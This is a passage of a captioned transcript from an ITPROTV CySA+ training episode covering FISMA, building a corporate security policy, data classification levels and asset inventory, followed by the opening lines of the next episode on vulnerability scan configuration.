is the FIPS, the Federal\ninformation not FIPS, what am I doing?\n\n260\n00:12:57.492 --> 00:13:00.511\nThis is the FISMA,\nthank you, thank you sir.\n\n261\n00:13:00.511 --> 00:13:04.310\nSecurity objects as the FISMA\ndefines three secure object,\n\n262\n00:13:04.310 --> 00:13:05.649\nI saw a FIPS in there,\n\n263\n00:13:05.649 --> 00:13:10.098\nin the title up here that threw me off.\n&gt;&gt; We find two security objectives talks\n\n264\n00:13:10.098 --> 00:13:14.782\nabout the confidentiality, integrity, and\navailability, CIA triad that we hold so\n\n265\n00:13:14.782 --> 00:13:18.070\nnear and dear to our hearts.\n&gt;&gt; Mm-hm, every morning I think about that\n\n266\n00:13:18.070 --> 00:13:19.812\ntriad, every morning.\n&gt;&gt; Yes he does, yes.\n\n267\n00:13:19.812 --> 00:13:22.075\nHe has a cup of coffee going,\nwhat does she know?\n\n268\n00:13:22.075 --> 00:13:22.723\n&gt;&gt; [LAUGH]\n\n269\n00:13:22.723 --> 00:13:24.730\n&gt;&gt; And he stares off into the distance,\n\n270\n00:13:24.730 --> 00:13:27.397\nand you could see the potential\nlook on his face-\n\n271\n00:13:27.397 --> 00:13:28.369\n&gt;&gt; And I think about the triad.\n\n272\n00:13:28.369 --> 00:13:29.376\n&gt;&gt; As he contemplates it.\n\n273\n00:13:29.376 --> 00:13:30.671\n[LAUGH]\n&gt;&gt; True.\n\n274\n00:13:30.671 --> 00:13:31.663\n&gt;&gt; Anyway, back to.\n\n275\n00:13:31.663 --> 00:13:32.364\n[LAUGH]\n&gt;&gt; Back to it.\n\n276\n00:13:32.364 --> 00:13:34.237\n&gt;&gt; Anyway, here's FISMA,\n\n277\n00:13:34.237 --> 00:13:37.139\nhere's the section for you right here.\n\n278\n00:13:37.139 --> 00:13:42.054\nUnder publication 199,\nCategorization of Information Systems.\n\n279\n00:13:42.054 --> 00:13:43.770\nLooks like section three or something.\n\n280\n00:13:43.770 --> 00:13:44.863\nHere we are.\n\n281\n00:13:44.863 --> 00:13:48.791\nSo those are the dictation\nfrom down on high.\n\n282\n00:13:48.791 --> 00:13:54.651\nNow, hopefully, there's a question\nringing in all of your ears.\n\n283\n00:13:54.651 --> 00:13:56.372\nWhat if I'm not in healthcare?\n\n284\n00:13:56.372 --> 00:13:58.030\nGovernment?\n\n285\n00:13:58.030 --> 00:13:59.782\nPayment card industry?\n\n286\n00:13:59.782 --> 00:14:02.994\nOr some sort of financial?\n&gt;&gt; I actually was gonna ask you,\n\n287\n00:14:02.994 --> 00:14:05.334\nwhat if I just have the convenience store?\n&gt;&gt; Right, and\n\n288\n00:14:05.334 --> 00:14:07.792\nthat is a fantastic question.\n\n289\n00:14:07.792 --> 00:14:11.133\nWhat if Zach is the head of\nthe largest chain of convenience?\n\n290\n00:14:11.133 --> 00:14:15.113\nWhat if he owns 7-Eleven or\nCircle K or Wawa or something-\n\n291\n00:14:15.113 --> 00:14:15.810\n&gt;&gt; Bob's convenience.\n\n292\n00:14:15.810 --> 00:14:18.061\n&gt;&gt; Bob's convenience has hit the market\n\n293\n00:14:18.061 --> 00:14:21.094\nhard, and\nthey're building things everywhere.\n\n294\n00:14:21.094 --> 00:14:22.933\nWhat does he have to do?\n\n295\n00:14:22.933 --> 00:14:27.052\nAt least his got employee data.\n&gt;&gt; Mm-hm.\n\n296\n00:14:27.052 --> 00:14:29.765\n&gt;&gt; He's got the data that's going to be\n\n297\n00:14:29.765 --> 00:14:32.841\ncoming from vendors.\n&gt;&gt; Right, and then PSI DSS of course that\n\n298\n00:14:32.841 --> 00:14:34.556\ngoes to that without saying.\n&gt;&gt; Correct, but\n\n299\n00:14:34.556 --> 00:14:37.025\nyou're probably outsourcing.\n&gt;&gt; But corporately.\n\n300\n00:14:37.025 --> 00:14:38.656\n&gt;&gt; All of a sudden he's got Bob's\n\n301\n00:14:38.656 --> 00:14:41.369\nconvenience store has\nbecome a corporate entity.\n\n302\n00:14:41.369 --> 00:14:41.981\n&gt;&gt; Mm-hm.\n\n303\n00:14:41.981 --> 00:14:43.122\n&gt;&gt; What does he do?\n\n304\n00:14:43.122 --> 00:14:48.236\nThere is no convenience store,\nat least not that I know of,\n\n305\n00:14:48.236 --> 00:14:52.449\nconvenience store regulatory act of 2014.\n\n306\n00:14:52.449 --> 00:14:53.342\nWhat does he do?\n\n307\n00:14:53.342 --> 00:14:56.722\nWhat he creates a cooperate policy.\n\n308\n00:14:56.722 --> 00:15:01.153\nAnd while yes,\ncompletely arbitrary, ultimately,\n\n309\n00:15:01.153 --> 00:15:06.252\nit does have some guides,\nit does have some, he is gonna be able\n\n310\n00:15:06.252 --> 00:15:11.571\nto look at his industry and see,\nand take from other industries.\n\n311\n00:15:11.571 --> 00:15:14.221\nNot, not, Zach,\nif he's the CEO it's probably not him,\n\n312\n00:15:14.221 --> 00:15:15.774\nit's gonna be his IT team.\n&gt;&gt; Mm-hm.\n\n313\n00:15:15.774 --> 00:15:18.151\n&gt;&gt; Right, along with their CSO, or CSO.\n\n314\n00:15:18.151 --> 00:15:19.003\n&gt;&gt; Right.\n\n315\n00:15:19.003 --> 00:15:21.538\n&gt;&gt; Getting together and figuring out what\n\n316\n00:15:21.538 --> 00:15:26.374\nwould be a good corporate policy when\nit comes to keeping our data secure and\n\n317\n00:15:26.374 --> 00:15:30.854\nmanaging vulnerabilities,\nwhich we have to create our own, okay?\n\n318\n00:15:30.854 --> 00:15:35.576\nAgain, you can steal from all these\nlovely compliance acts that we\n\n319\n00:15:35.576 --> 00:15:39.874\nhave available to us and\nkind of Frankenstein one together,\n\n320\n00:15:39.874 --> 00:15:43.936\na lot of companies do that,\nit's a very good way to do it.\n\n321\n00:15:43.936 --> 00:15:48.090\nBut I'm just making sure I'm\nnot missing anything here.\n\n322\n00:15:48.090 --> 00:15:50.828\nYeah, you're just,\nbasically contriving your own policy.\n\n323\n00:15:50.828 --> 00:15:52.112\n&gt;&gt; Mm-hm.\n\n324\n00:15:52.112 --> 00:15:52.865\n&gt;&gt; So take and\n\n325\n00:15:52.865 --> 00:15:55.048\nsteal from whatever you need.\n\n326\n00:15:55.048 --> 00:15:58.315\nYou have take a very good\nlook at your You entity,\n\n327\n00:15:58.315 --> 00:16:02.221\nyour organization,\nyour environment that you're in and\n\n328\n00:16:02.221 --> 00:16:06.141\nsee where the data might be and\nhow someone might get at it.\n\n329\n00:16:06.141 --> 00:16:11.602\nOr, so it's all up to us security\nprofessionals to do for our employers.\n\n330\n00:16:11.602 --> 00:16:15.280\nBut once you've created that,\nthat becomes your workflow.\n\n331\n00:16:15.280 --> 00:16:17.390\nThat becomes the standard.\n\n332\n00:16:17.390 --> 00:16:21.360\nNow, does that mean we never go back and\nrevise and tweak and peek.\n\n333\n00:16:21.360 --> 00:16:23.970\nNo, of course not.\n&gt;&gt; It will always be evolving as we go\n\n334\n00:16:23.970 --> 00:16:25.970\nforward.\n&gt;&gt; Yeah, exactly.\n\n335\n00:16:25.970 --> 00:16:27.090\nI like that, evolving.\n\n336\n00:16:27.090 --> 00:16:29.140\nThis is a living document in\n\n337\n00:16:29.140 --> 00:16:30.120\na lot of ways.\n&gt;&gt; Yeah.\n\n338\n00:16:30.120 --> 00:16:31.620\n&gt;&gt; As things changed,\n\n339\n00:16:31.620 --> 00:16:35.130\nyou need to be updating\nthat workflow accordingly.\n\n340\n00:16:35.130 --> 00:16:37.940\nSo that, the new vulnerabilities and\n\n341\n00:16:37.940 --> 00:16:41.900\nthrusts that come out,\nyou are not taken by surprise by it.\n\n342\n00:16:41.900 --> 00:16:42.940\nYou know about them.\n\n343\n00:16:42.940 --> 00:16:44.080\nYou plan for them.\n\n344\n00:16:44.080 --> 00:16:45.950\nYou revise your corporate policy.\n\n345\n00:16:45.950 --> 00:16:47.280\nYou put it into effect.\n\n346\n00:16:47.280 --> 00:16:53.190\nThat's why people sign NDAs and\nthe current company handbook,\n\n347\n00:16:53.190 --> 00:16:54.390\nplay handbook.\n&gt;&gt; Mm-hm.\n\n348\n00:16:54.390 --> 00:16:56.520\n&gt;&gt; That puts those kinda things out.\n\n349\n00:16:56.520 --> 00:16:59.430\nAnd as a security worker\nyou'll have that information\n\n350\n00:16:59.430 --> 00:17:02.880\nat your ready on maybe the Internet site,\nor wherever you keep it.\n\n351\n00:17:02.880 --> 00:17:07.730\nSo that you can look to it and go, I've\nbeen compliant with our corporate policy.\n\n352\n00:17:07.730 --> 00:17:10.700\nAnd the cool thing about creating\nyour own corporate policy is\n\n353\n00:17:10.700 --> 00:17:12.702\nyou can be as secure as you like.\n\n354\n00:17:12.702 --> 00:17:17.920\nWhereas HIPAA tells you,\nyou must do it this way, you can go.\n\n355\n00:17:17.920 --> 00:17:19.420\nWell, no, I don't.\n&gt;&gt; [LAUGH]\n\n356\n00:17:19.420 --> 00:17:21.470\n&gt;&gt; I can do it more robustly.\n\n357\n00:17:21.470 --> 00:17:24.340\nI can put in that we must\ndo penetration testing,\n\n358\n00:17:24.340 --> 00:17:25.958\nand maybe HIPAA doesn't have that.\n\n359\n00:17:25.958 --> 00:17:28.850\nOr maybe HIPAA says, yeah,\nyou gotta pen test once a year.\n\n360\n00:17:28.850 --> 00:17:31.510\nAnd we're like, not enough,\nI want twice a year.\n\n361\n00:17:31.510 --> 00:17:34.150\nOur corporate policy says\nwe must do a pen test.\n\n362\n00:17:34.150 --> 00:17:37.590\nOne doing white box testing and\none doing black box testing.\n\n363\n00:17:37.590 --> 00:17:38.400\n&gt;&gt; Like once a quarter.\n\n364\n00:17:38.400 --> 00:17:40.304\n&gt;&gt; Yeah, we're gonna do one internal test\n\n365\n00:17:40.304 --> 00:17:42.745\nand we're gonna do one external tests.\n\n366\n00:17:42.745 --> 00:17:43.825\nAnd there you go.\n\n367\n00:17:43.825 --> 00:17:45.245\nSo you get to set up any way you want.\n\n368\n00:17:45.245 --> 00:17:48.505\nSo there's a lot of freedom in not\nbeing under a regulatory body.\n\n369\n00:17:50.595 --> 00:17:54.295\nAll right,\nlet's move into data classification.\n\n370\n00:17:54.295 --> 00:17:56.419\nThis is an important subject.\n\n371\n00:17:56.419 --> 00:18:02.567\nIf I ask you basically like\nwhat kind of data is this?\n\n372\n00:18:02.567 --> 00:18:03.529\nWhat do you mean?\n\n373\n00:18:03.529 --> 00:18:04.503\nLike what is this?\n\n374\n00:18:04.503 --> 00:18:05.270\nIs this public data?\n\n375\n00:18:05.270 --> 00:18:06.450\nCan anybody have access to this?\n\n376\n00:18:06.450 --> 00:18:07.870\nOr it's sensitive data?\n\n377\n00:18:07.870 --> 00:18:11.050\nYou need to start breaking these\nthings down in classifying\n\n378\n00:18:11.050 --> 00:18:12.320\nthe different types of data.\n\n379\n00:18:12.320 --> 00:18:17.180\nActually created my own class\nlocation system when I get the Chrome\n\n380\n00:18:17.180 --> 00:18:21.703\nbrowser out of the way,\nwe're gonna slide here, here we go.\n\n381\n00:18:21.703 --> 00:18:25.597\nAnd let's walk through some of\nthis data and see what I mean by,\n\n382\n00:18:25.597 --> 00:18:30.376\nI've created this labels completely\nin arbitrary, you can use some other,\n\n383\n00:18:30.376 --> 00:18:34.711\ninstead of level one, you can say public,\nyou just call public data or\n\n384\n00:18:34.711 --> 00:18:38.950\nwhatever, you can go crazy,\njust call it anything you like.\n\n385\n00:18:38.950 --> 00:18:41.170\nI just use these terms,\nLevel 1, Level 2, Level 3 and\n\n386\n00:18:41.170 --> 00:18:44.990\nLevel 4 for my own classification system.\n&gt;&gt; Could I call it a ratio?\n\n387\n00:18:44.990 --> 00:18:45.770\n&gt;&gt; Yes,\n\n388\n00:18:45.770 --> 00:18:46.500\nyes.\n&gt;&gt; Okay.\n\n389\n00:18:46.500 --> 00:18:48.680\n&gt;&gt; Well, that would probably not be very\n\n390\n00:18:48.680 --> 00:18:54.310\ndescriptive and helpful to someone\nwho's unaware of the nomenclature but\n\n391\n00:18:54.310 --> 00:18:56.710\nyes, you could totally do that.\n\n392\n00:18:56.710 --> 00:18:59.972\nAnd some people do, so just be\naware that that is at your beck and\n\n393\n00:18:59.972 --> 00:19:01.835\ncall you can do it if you would like.\n\n394\n00:19:01.835 --> 00:19:06.918\nSo let's talk about level 1, public data,\nthis is open to the general public.\n\n395\n00:19:06.918 --> 00:19:11.780\nAnything, so I've got contact information,\nthat's open, I want people to\n\n396\n00:19:11.780 --> 00:19:16.730\ncontact my organization if I'm in business\nor if I provide a service of some way,\n\n397\n00:19:16.730 --> 00:19:20.890\nif I'm organization, what's the purpose of\nbeing organization if no one can like I\n\n398\n00:19:20.890 --> 00:19:24.740\nsaid it's the NSA but anyway, [LAUGH]\nno one should be contacting or any.\n\n399\n00:19:24.740 --> 00:19:27.750\nWe contact you, you don't contact us.\n&gt;&gt; [LAUGH]\n\n400\n00:19:27.750 --> 00:19:30.900\n&gt;&gt; Anyway, product info and\n\n401\n00:19:30.900 --> 00:19:36.350\nprocess of if you are a company that\ncreates a service or create a product,\n\n402\n00:19:36.350 --> 00:19:41.620\nit would be nice to disclose that to the\npublic which I peeve of mine by the way.\n\n403\n00:19:41.620 --> 00:19:46.454\nWhen I go to a website and\nsays you know, add to cart for\n\n404\n00:19:46.454 --> 00:19:50.224\nprice, I loath that I cannot stand that.\n\n405\n00:19:50.224 --> 00:19:51.795\nI mean-\n&gt;&gt; It's the hidden browser.\n\n406\n00:19:51.795 --> 00:19:53.175\n&gt;&gt; Yeah, it's just a marketing\n\n407\n00:19:53.175 --> 00:19:53.965\nplot to get me there.\n\n408\n00:19:53.965 --> 00:19:55.515\nWell, I heard it kinda committed.\n\n409\n00:19:55.515 --> 00:19:58.625\nI guess that I'll finish even\nthough it's $200 more than\n\n410\n00:19:58.625 --> 00:20:01.225\nI was willing to pay.\n&gt;&gt; I don't like it when they hide their\n\n411\n00:20:01.225 --> 00:20:02.840\nshipping costs.\n&gt;&gt; [LAUGH]\n\n412\n00:20:02.840 --> 00:20:04.062\n&gt;&gt; That should be upfront, as well.\n\n413\n00:20:04.062 --> 00:20:05.926\nOkay, well, 12.50 is good.\n\n414\n00:20:05.926 --> 00:20:10.118\nAnd you go to the cart, you go to\nthe check out and shipping is $110.\n\n415\n00:20:10.118 --> 00:20:12.561\n[LAUGH] Woah!\n&gt;&gt; Can you receive a flat bed trailer at\n\n416\n00:20:12.561 --> 00:20:13.367\nyour house?\n\n417\n00:20:13.367 --> 00:20:18.042\n[LAUGH] Exactly, so these are things\nthat you would want disclosed,\n\n418\n00:20:18.042 --> 00:20:22.920\nopen to the general public, so that they\ncan see and know what you do, who you are.\n\n419\n00:20:22.920 --> 00:20:27.400\nAnd any services you offer,\nproducts that you are selling.\n\n420\n00:20:27.400 --> 00:20:28.950\nThese are the things that\nyou wanna let people know,\n\n421\n00:20:28.950 --> 00:20:31.900\nis the about page on your website,\nthat kinda stuff.\n\n422\n00:20:31.900 --> 00:20:33.950\nThat is public and\n\n423\n00:20:33.950 --> 00:20:36.190\nwhat I called level one.\n&gt;&gt; Mm-hm.\n\n424\n00:20:36.190 --> 00:20:38.110\n&gt;&gt; So let's move to level 2,\n\n425\n00:20:38.110 --> 00:20:39.480\ninternal data.\n\n426\n00:20:39.480 --> 00:20:43.190\nSo internal data should only be\nshared with internal personnel, but\n\n427\n00:20:43.190 --> 00:20:46.720\nit's not catastrophic if it's leaked.\n\n428\n00:20:46.720 --> 00:20:48.270\nIf it gets out.\n\n429\n00:20:48.270 --> 00:20:50.420\nSo someone takes an employee\nhandbook home and\n\n430\n00:20:50.420 --> 00:20:54.260\ntheir spouse reads it and\nthey found it interesting.\n\n431\n00:20:54.260 --> 00:20:58.598\nSome strange reason left it on the bus and\nsome other person picks it up moves,\n\n432\n00:20:58.598 --> 00:21:00.200\nwhat's this and finds it and\n\n433\n00:21:00.200 --> 00:21:04.140\nits not like a huge deal hopefully\nthere's no credentials in there but\n\n434\n00:21:04.140 --> 00:21:09.016\nit's gonna be organizational charts,\nsales numbers, how we've done the quarter,\n\n435\n00:21:09.016 --> 00:21:13.682\nour doing for the year, what's our\nprojected sales, that kind of information.\n\n436\n00:21:13.682 --> 00:21:16.937\nFinance, where's the accounts payable,\naccounts perceivable,\n\n437\n00:21:16.937 --> 00:21:18.180\nthat kinda information.\n\n438\n00:21:18.180 --> 00:21:22.006\nWell, kind of sensitive,\ndepending on your industry,\n\n439\n00:21:22.006 --> 00:21:27.020\nthat could fall under a different\ncategory moving to level three.\n\n440\n00:21:27.020 --> 00:21:31.830\nSome financial information could be super,\nsuper sensitive, but some of it's not.\n\n441\n00:21:31.830 --> 00:21:33.950\nSo that's a little gray area there.\n\n442\n00:21:33.950 --> 00:21:35.990\nMarketing campaigns that you're doing.\n\n443\n00:21:35.990 --> 00:21:38.300\nEventually, all marketing campaigns\nare gonna get out anyway because\n\n444\n00:21:38.300 --> 00:21:39.120\nyou're marketing.\n\n445\n00:21:39.120 --> 00:21:40.343\nThat's what you're doing.\n\n446\n00:21:40.343 --> 00:21:42.160\nAnd HR information.\n\n447\n00:21:42.160 --> 00:21:43.470\nSome of that again.\n\n448\n00:21:43.470 --> 00:21:47.511\nYou don't want it to get out that\nBob's making $42,000 a year.\n\n449\n00:21:47.511 --> 00:21:48.405\n&gt;&gt; [LAUGH]\n\n450\n00:21:48.405 --> 00:21:49.927\n&gt;&gt; And that Sally's making,\n\n451\n00:21:49.927 --> 00:21:51.320\n$62,000 a year.\n\n452\n00:21:51.320 --> 00:21:53.428\nHe's making $22,000 more than Bob.\n\n453\n00:21:53.428 --> 00:21:56.140\nYou don't want it to get out but\nif it does, it's not the end of the world.\n\n454\n00:21:56.140 --> 00:22:00.275\nIt's just a bit of a maybe\npublic relations nightmare.\n\n455\n00:22:00.275 --> 00:22:03.905\nYou've got to and let me get Bob's over\nthere going off, of course you're making\n\n456\n00:22:03.905 --> 00:22:07.855\n20 grand more than me and well, like Bob,\nshe's got a PhD in this and you don't.\n\n457\n00:22:07.855 --> 00:22:12.095\nSo shut up, sit down and\ndo your work, that kinda thing.\n\n458\n00:22:12.095 --> 00:22:14.325\nLet's get a level 3, sensitive data and\n\n459\n00:22:14.325 --> 00:22:17.335\nhours there to hit the nitty-gritty\nthere where the metal meets the meat.\n\n460\n00:22:17.335 --> 00:22:21.960\nSo sensitive data, it could negatively\nimpact the company if this information\n\n461\n00:22:21.960 --> 00:22:27.360\nwere to be disclosed to the general\npublic, or to a competing industry.\n\n462\n00:22:27.360 --> 00:22:30.753\nSo this would be employee reviews.\n\n463\n00:22:30.753 --> 00:22:34.490\nAgain, you usually don't\nlet that stuff out.\n\n464\n00:22:34.490 --> 00:22:36.660\nThat could get somebody to\nwanna go to a competitor, or\n\n465\n00:22:36.660 --> 00:22:37.943\nbecome an inside threat to you.\n\n466\n00:22:37.943 --> 00:22:40.250\nThis could be used as leverage.\n\n467\n00:22:40.250 --> 00:22:46.180\nIf this got outs, your review status\nis maybe, as a manager, you put\n\n468\n00:22:46.180 --> 00:22:50.950\nsome information into an employee review\nthat was maybe a bit negative or that.\n\n469\n00:22:50.950 --> 00:22:52.650\nBob really needs to step up his game.\n\n470\n00:22:52.650 --> 00:22:56.406\nHe's a decent employee, but\nI'd like to see him reach for\n\n471\n00:22:56.406 --> 00:22:58.332\nthe brass ring a little more.\n\n472\n00:22:58.332 --> 00:23:03.132\nAnd then a competitor gets\na hold of that information\n\n473\n00:23:03.132 --> 00:23:07.071\nthrough corporate espionage, hacking.\n\n474\n00:23:07.071 --> 00:23:08.841\nThey get that data disclosure and\n\n475\n00:23:08.841 --> 00:23:12.440\nnow they're able to waltz up to Bob\nin a park while he eats his lunch,\n\n476\n00:23:12.440 --> 00:23:16.790\ncontemplating his life, and go,\nwhat do you do for a living, Bob?\n\n477\n00:23:16.790 --> 00:23:18.577\nWell, I work for XYZ company.\n\n478\n00:23:18.577 --> 00:23:19.790\nHow do you like it there?\n\n479\n00:23:19.790 --> 00:23:21.203\n[SOUND] It's okay.\n\n480\n00:23:21.203 --> 00:23:24.812\nWell, you know I actually for\nABC company, your competitor, and\n\n481\n00:23:24.812 --> 00:23:28.628\nfrom what I understand they're not\nreally happy with you over at XYZ.\n\n482\n00:23:28.628 --> 00:23:32.385\nYou see how these things can evolve so you\ncan turn someone into an insider threat.\n\n483\n00:23:32.385 --> 00:23:33.945\nOr just disclose this information,\n\n484\n00:23:33.945 --> 00:23:36.750\npeople don't like data\ndisclosed about themselves.\n\n485\n00:23:36.750 --> 00:23:41.200\nThis is a big deal nowadays so we wanna\nkeep that kinda stuff on lock and key.\n\n486\n00:23:41.200 --> 00:23:46.271\nThird party contracts, definitely\nyou wanna keep that on the down low.\n\n487\n00:23:46.271 --> 00:23:50.597\nAgain, not like this isn't\nthe end of the world but\n\n488\n00:23:50.597 --> 00:23:55.130\nit's pretty bad if that\nkinda information gets out.\n\n489\n00:23:55.130 --> 00:24:02.330\nAnd in Level 4 Highly-Sensitive Data,\nthis is the barn is burning.\n\n490\n00:24:02.330 --> 00:24:05.470\nData has been disclosed\nto the general public.\n\n491\n00:24:05.470 --> 00:24:08.690\nWe are now in a real,\nreal deep shi-poo-poo.\n\n492\n00:24:08.690 --> 00:24:10.330\nOkay, as I'd like to say.\n\n493\n00:24:10.330 --> 00:24:13.460\nUp to waist deep to neck,\nsomewhere in that area.\n\n494\n00:24:13.460 --> 00:24:14.531\nRight?\n[LAUGH]\n\n495\n00:24:14.531 --> 00:24:16.842\n&gt;&gt; This is social security number.\n\n496\n00:24:16.842 --> 00:24:19.416\n&gt;&gt; First time I've ever heard that phrase\n\n497\n00:24:19.416 --> 00:24:21.741\n[LAUGH].\n&gt;&gt; Credit card numbers,\n\n498\n00:24:21.741 --> 00:24:27.858\nhealth information, all the fun stuff that\nwe see on a daily basis if you follow\n\n499\n00:24:27.858 --> 00:24:33.990\nany kind of security blogs or news\noutlets that do IT security as a thing.\n\n500\n00:24:33.990 --> 00:24:38.177\nYou'll see that, I kid you not,\nit's a daily thing, I pull up my feed,\n\n501\n00:24:38.177 --> 00:24:40.930\nI'm reading the news, and such and\n\n502\n00:24:40.930 --> 00:24:43.980\nsuch company had data breach,\nX amount of thing.\n\n503\n00:24:43.980 --> 00:24:48.840\nWe're calling it small because it's only\n200,000 users and you're like, yeah yeah.\n\n504\n00:24:48.840 --> 00:24:53.190\nIf you put 200,000 people in a room,\nthat's a lot of people.\n\n505\n00:24:53.190 --> 00:24:53.700\n&gt;&gt; It's a lot of people.\n\n506\n00:24:53.700 --> 00:24:56.030\n&gt;&gt; It's a lot of people, okay?\n\n507\n00:24:56.030 --> 00:24:57.590\nSo to say that that's small.\n\n508\n00:24:57.590 --> 00:25:01.670\nIt's small in relation to\nthe fact that you have three\n\n509\n00:25:01.670 --> 00:25:06.450\nmillion users altogether in your database,\nyes, small in comparison, but\n\n510\n00:25:06.450 --> 00:25:09.386\nthat is not a small data breach,\nthat's a big data breach.\n\n511\n00:25:09.386 --> 00:25:14.380\nBut no likey because it's information\nthat could be used, what we call\n\n512\n00:25:14.380 --> 00:25:19.110\npersonally identifiable information or\nPII or pie as it gets referred to as.\n\n513\n00:25:19.110 --> 00:25:25.920\nThis is stuff that I could use as\nan attacker to do identity theft.\n\n514\n00:25:25.920 --> 00:25:28.620\nTo open credit in your name and ruin you.\n\n515\n00:25:28.620 --> 00:25:30.100\nThings of that nature.\n\n516\n00:25:30.100 --> 00:25:31.720\nThat is what credit card numbers.\n\n517\n00:25:31.720 --> 00:25:35.130\nI wonder what I could do if I\nhad Zach's credit information?\n\n518\n00:25:35.130 --> 00:25:37.005\n&gt;&gt; Buy a piece of gum.\n\n519\n00:25:37.005 --> 00:25:38.820\n&gt;&gt; Yeah and\n\n520\n00:25:38.820 --> 00:25:42.240\na tasty piece it would be because\nI didn't spend my own money\n\n521\n00:25:42.240 --> 00:25:43.170\nto get it.\n&gt;&gt; [LAUGH]\n\n522\n00:25:43.170 --> 00:25:44.290\n&gt;&gt; Then it would guilt and shame for\n\n523\n00:25:44.290 --> 00:25:45.358\nall the theft I'd done.\n\n524\n00:25:45.358 --> 00:25:46.530\n[LAUGH]\n&gt;&gt; That is true.\n\n525\n00:25:46.530 --> 00:25:47.790\n&gt;&gt; Would wave over me and\n\n526\n00:25:47.790 --> 00:25:51.920\nI'd cry in a corner and have to apologize\nto Zach for stealing his 25 cents.\n\n527\n00:25:51.920 --> 00:25:53.040\nBut there you go, right?\n\n528\n00:25:53.040 --> 00:25:56.360\nThis is information we\ncannot let out at all.\n\n529\n00:25:56.360 --> 00:26:01.000\nSo get your data classification\ndown inside of your program so\n\n530\n00:26:01.000 --> 00:26:04.010\nthat when you have data you can say,\nwell, this.\n\n531\n00:26:04.010 --> 00:26:07.960\nIt's gonna come in handy\nas you prioritize things.\n\n532\n00:26:07.960 --> 00:26:08.580\n&gt;&gt; Falls into different\n\n533\n00:26:08.580 --> 00:26:10.630\ncategories.\n&gt;&gt; Correct.\n\n534\n00:26:10.630 --> 00:26:14.580\nDue to the categorization, some things\nmight be more important than others.\n\n535\n00:26:14.580 --> 00:26:16.020\nSo let's just keep that in mind.\n\n536\n00:26:16.020 --> 00:26:16.670\nAnything else?\n\n537\n00:26:16.670 --> 00:26:19.930\nAsset inventory kind of\nfalls along this lines of,\n\n538\n00:26:19.930 --> 00:26:23.180\nnot only do you have data,\nbut you also have assets.\n\n539\n00:26:23.180 --> 00:26:28.220\nThese are computers, mobile devices,\nanything that might have an asset tag\n\n540\n00:26:28.220 --> 00:26:32.810\non it that the company has purchased\nthat has information contained on it.\n\n541\n00:26:32.810 --> 00:26:37.635\nSome things will be more critical than\nnot, typically you just see critical and\n\n542\n00:26:37.635 --> 00:26:39.180\nnon-critical systems.\n\n543\n00:26:39.180 --> 00:26:44.460\nYou want to label those because\nit will help you down the road\n\n544\n00:26:44.460 --> 00:26:47.660\nwhen you're making decisions\nabout your scanning policies.\n\n545\n00:26:47.660 --> 00:26:52.387\nSo if I have a non-critical system I might\nnot be so intensively scanning it or\n\n546\n00:26:52.387 --> 00:26:55.895\nmore frequently scanning or\nless frequently scanning.\n\n547\n00:26:55.895 --> 00:26:57.842\nYou see how these things can kind of play\n\n548\n00:26:57.842 --> 00:26:58.390\nout?\n&gt;&gt; Hm-mm.\n\n549\n00:26:58.390 --> 00:27:01.683\n&gt;&gt; Depending on the assets categorisation.\n\n550\n00:27:01.683 --> 00:27:04.414\nBut I think for\nright now we're going to call it a day,\n\n551\n00:27:04.414 --> 00:27:08.144\nwe'll let you chew on that fat a little\nbit and absorb that information.\n\n552\n00:27:08.144 --> 00:27:10.578\nPlus we're running a little bit out of\ntime, so it's a good stopping stop for\n\n553\n00:27:10.578 --> 00:27:11.820\nus here.\n&gt;&gt; Great advice.\n\n554\n00:27:11.820 --> 00:27:14.120\nVulnerability management process.\n\n555\n00:27:14.120 --> 00:27:15.040\nWonderful episode.\n\n556\n00:27:15.040 --> 00:27:15.990\nBefore me move on though,\n\n557\n00:27:15.990 --> 00:27:20.570\ndo you have any last words Daniel?\n&gt;&gt; Just, if you're under those regulatory\n\n558\n00:27:20.570 --> 00:27:26.070\nsystems, definitely be familiar\nwith the regulations of the company\n\n559\n00:27:26.070 --> 00:27:30.110\nthat you're in or the organization or\nenterprise that you fall under.\n\n560\n00:27:30.110 --> 00:27:32.800\nAnd even if you're not, for the exam,\nit's probably a good idea just to have\n\n561\n00:27:32.800 --> 00:27:36.650\na general idea of what the controls\nare that are built in.\n\n562\n00:27:36.650 --> 00:27:39.480\nAt least know the acronyms and\nwhat they go to, right?\n\n563\n00:27:39.480 --> 00:27:45.930\nSo HIPAA is for health, and\nthat FISMA is for federal things, right?\n\n564\n00:27:45.930 --> 00:27:47.550\nAnd PCI is payment card industry.\n\n565\n00:27:47.550 --> 00:27:49.830\nThat's the kinds of things you\ndefinitely wanna know for the exam so\n\n566\n00:27:49.830 --> 00:27:53.320\njust let that be your take away.\n&gt;&gt; Good job Daniel.\n\n567\n00:27:53.320 --> 00:27:54.270\nThanks very much and\n\n568\n00:27:54.270 --> 00:27:59.200\nmake sure you watch every episode of CYSA+\nor C-Y-S-A+ however you like to say that.\n\n569\n00:27:59.200 --> 00:28:00.890\nAnd you'll be in the course library too.\n\n570\n00:28:00.890 --> 00:28:03.780\nThere's thousands of other\nhours of content in there.\n\n571\n00:28:03.780 --> 00:28:06.563\nOne reason to help you go further,\nso check all that out too.\n\n572\n00:28:06.563 --> 00:28:08.671\nAnd tell everybody you know about ITPROTV.\n\n573\n00:28:08.671 --> 00:28:10.100\nITPROTV is binge worthy.\n\n574\n00:28:10.100 --> 00:28:10.770\nThanks for watching.\n\n575\n00:28:10.770 --> 00:28:12.210\nI'm Zach Memos.\n&gt;&gt; And I'm Daniel

to speed with scanning.\n\n16\n00:00:35.930 --> 00:00:41.920\nHow we can configure our scans, so that we\ncan be compliant or going along with our\n\n17\n00:00:41.920 --> 00:00:47.630\ncompany policy that we've created for our\nvulnerability management process, right?\n\n18\n00:00:47.630 --> 00:00:49.240\nSo that's what we've\nbeen talking about and\n\n19\n00:00:49.240 --> 00:00:52.800\nthis is a little more of a detailed\nlook into some of the inner workings\n\n20\n00:00:52.800 --> 00:00:57.430\nof that process which is the scanning\nphase of what we're gonna do with\n\n21\n00:00:57.430 --> 00:00:58.430\nvulnerability management.\n&gt;&gt; So\n\n22\n00:00:58.430 --> 00:01:01.970\nDaniel, what is a scan configuration?\n&gt;&gt; That's a great question.\n\n23\n00:01:01.970 --> 00:01:07.220\nIt is how we configure the vulnerability\nscanner that we are going to use\n\n24\n00:01:07.220 --> 00:01:11.730\nto look for vulnerabilities inside of\nour systems, vulnerability scanner,\n\n25\n00:01:11.730 --> 00:01:14.490\nguess what it does, it scans for\nvulnerabilities, makes sense.\n\n26\n00:01:14.490 --> 00:01:16.340\nAnd I love those 